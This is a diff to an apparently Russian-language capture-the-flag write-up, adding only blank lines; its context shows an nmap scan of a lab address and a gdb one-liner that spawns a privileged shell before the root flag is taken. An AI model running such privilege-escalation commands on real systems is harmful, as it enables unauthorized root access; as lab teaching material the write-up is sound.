@@ -5,6 +5,7 @@
 nmap -sC -sV 10.10.124.86
 ```
 ![ScreenShot](screenshots/1.png)
+
 Мы нашли:
 - 22 port - SSH (OpenSSH 7.9p1)
 - 80 port - HTTP (Apache httpd 2.4.38)
@@ -63,4 +64,5 @@ gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
 ![ScreenShot](screenshots/12.png)
 
 Забираем root-флаг:
+
 ![ScreenShot](screenshots/13.png)
